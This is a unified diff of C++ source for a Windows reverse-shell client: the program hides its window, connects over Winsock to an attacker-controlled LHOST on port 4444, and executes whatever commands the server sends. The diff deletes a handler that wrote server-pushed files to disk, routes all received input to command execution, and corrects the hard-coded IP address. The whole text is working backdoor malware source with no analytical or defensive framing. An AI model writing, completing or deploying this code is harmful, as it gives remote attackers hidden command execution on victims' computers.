@@ -2,7 +2,7 @@
 #include <string>
 #include <winsock2.h>
 #include <windows.h>
-#include <fstream> // Required for file operations
+#include <fstream> // For file operations (if needed elsewhere)
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -26,37 +26,6 @@ void executeCommand(const string& command) {
     // Do something with the result, e.g., send back to the server
 }
 
-// Handle the file upload from the server to the client
-void handleUpload(SOCKET& connSocket) {
-    char buffer[1024];
-    int bytesReceived;
-
-    bytesReceived = recv(connSocket, buffer, sizeof(buffer) - 1, 0);
-    if (bytesReceived <= 0) {
-        return;
-    }
-
-    string uploadCommand(buffer);
-    uploadCommand = uploadCommand.substr(0, uploadCommand.find("\n"));  // Trim trailing newline
-
-    if (uploadCommand.substr(0, 6) == "upload") {
-        string fileName = uploadCommand.substr(7);  // Extract filename
-
-        // Open the file to write
-        ofstream outFile(fileName, ios::binary);  // Ensure ofstream is correctly used
-        if (!outFile) {
-            return;
-        }
-
-        // Read the file data and write to file
-        while ((bytesReceived = recv(connSocket, buffer, sizeof(buffer), 0)) > 0) {
-            outFile.write(buffer, bytesReceived);
-        }
-
-        outFile.close();
-    }
-}
-
 // Entry point for a Windows Application (non-console)
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     // Hide the window
@@ -65,7 +34,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     WSADATA wsaData;
     SOCKET connSocket;
     sockaddr_in serverAddr;
-    string serverIP = "10.0.135";  // Replace with LHOST (server IP)
+    string serverIP = "10.0.1.35";  // Replace with LHOST (server IP)
     int serverPort = 4444;  // Replace with LPORT (server port)
 
     // Initialize Winsock
@@ -106,12 +75,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
             break;
         }
 
-        if (command.substr(0, 6) == "upload") {
-            handleUpload(connSocket);
-        } else {
-            // Execute the command received from the server
-            executeCommand(command);
-        }
+        // Execute the command received from the server
+        executeCommand(command);
     }
 
     closesocket(connSocket);
